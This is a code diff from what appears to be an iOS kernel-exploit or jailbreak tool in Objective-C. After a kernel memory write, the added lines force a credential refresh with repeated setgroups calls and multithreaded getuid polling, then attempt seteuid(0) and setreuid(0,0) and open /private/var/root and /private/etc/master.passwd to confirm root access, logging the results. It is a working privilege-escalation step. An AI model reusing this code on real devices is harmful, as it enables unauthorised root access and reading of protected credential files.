@@ -2791,12 +2791,27 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             uid_t u1 = getuid(), e1 = geteuid();
             int su = setuid(0);
             uid_t u2 = getuid(), e2 = geteuid();
+            // 2.0.71: форсим refresh — setgroups + опрос getuid с других потоков
+            gid_t gA[1] = { 501 }, gB[2] = { 501, 502 };
+            for (int i = 0; i < 20; i++) { setgroups(1, gA); setgroups(2, gB); }
+            setgroups(1, gA);
+            __block uid_t seen = 0xFFFF;
+            dispatch_apply(4, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^(size_t idx) {
+                for (int k = 0; k < 200; k++) {
+                    uid_t g = getuid();
+                    if (g == 0) { seen = 0; break; }
+                    if (idx == 0 && k == 0) seen = g;
+                }
+            });
+            int se = seteuid(0);
+            int sr = setreuid(0, 0);
+            uid_t u3 = getuid(), e3 = geteuid();
             int fdR = open("/private/var/root", O_RDONLY);
             int eOpen = errno;
             int fdM = open("/private/etc/master.passwd", O_RDONLY);
             int eM = errno;
-            kpNote(r, [NSString stringWithFormat:@"  [W501] after write n=%d readback=%016llx setuid0=%d uid %u→%u euid %u→%u open/root=%d/e%d master=%d/e%d",
-                      nSaved, (unsigned long long)r0, su, u1, u2, e1, e2, fdR, eOpen, fdM, eM]);
+            kpNote(r, [NSString stringWithFormat:@"  [W501] after write n=%d readback=%016llx setuid=%d seteuid=%d setreuid=%d thrseen=%u uid %u→%u→%u open/root=%d/e%d master=%d/e%d",
+                      nSaved, (unsigned long long)r0, su, se, sr, (unsigned)seen, u1, u2, u3, fdR, eOpen, fdM, eM]);
             if (fdR >= 0) close(fdR);
             if (fdM >= 0) close(fdM);
             if (u2 == 0 || e2 == 0) {
